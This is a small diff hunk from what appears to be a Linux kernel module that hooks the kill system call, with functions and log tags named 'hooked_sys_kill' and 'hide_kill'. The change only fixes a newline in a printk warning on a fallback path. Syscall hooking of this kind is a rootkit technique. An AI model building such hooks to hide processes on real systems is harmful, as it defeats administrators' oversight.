@@ -47,8 +47,7 @@ static asmlinkage long hooked_sys_kill(pid_t pid, int sig)
     }
 
     // Fallback if original_sys_kill is NULL
-    printk(KERN_WARNING "[hide_kill] original_sys_kill is NULL!
-");
+    printk(KERN_WARNING "[hide_kill] original_sys_kill is NULL!\n");
     return -ENOSYS;
 }
 
